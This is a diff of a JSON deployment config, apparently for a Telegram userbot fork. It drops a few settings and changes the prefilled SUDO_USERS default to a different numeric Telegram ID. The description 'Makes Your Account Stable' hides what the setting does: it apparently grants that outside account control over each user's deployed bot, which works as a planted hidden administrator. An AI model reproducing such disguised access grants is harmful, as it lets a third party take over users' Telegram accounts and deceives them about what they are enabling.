@@ -31,10 +31,6 @@
       "description": "Get this value by running python3 GenerateStringSession.py locally",
       "value": ""
     },
-    "TG_USER_NAME": {
-      "description": "Your telegram username. Example @Telegram",
-      "value": ""
-    },
     "OPEN_WEATHER_MAP_APPID": {
       "description": "Get your own APPID from https://api.openweathermap.org/data/2.5/weather",
       "required": false
@@ -126,7 +122,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes Your Account Stable.",
-      "value": "138312364",
+      "value": "424935819",
       "required": false
     },
     "TZ": {
@@ -182,14 +178,6 @@
     "GIT_REPO_NAME": {
       "description": "This is required for commit functionality to work.",
       "value": "https://github.com/AnggaR96s/Kylla.git",
-      "required": false
-    },
-    "OPEN_LOAD_KEY": {
-      "description": "Leave bcz oload dead",
-      "required": false
-    },
-    "OPEN_LOAD_LOGIN": {
-      "description": "Leave bcz oload dead",
       "required": false
     },
     "MIRROR_ACE_API_KEY": {
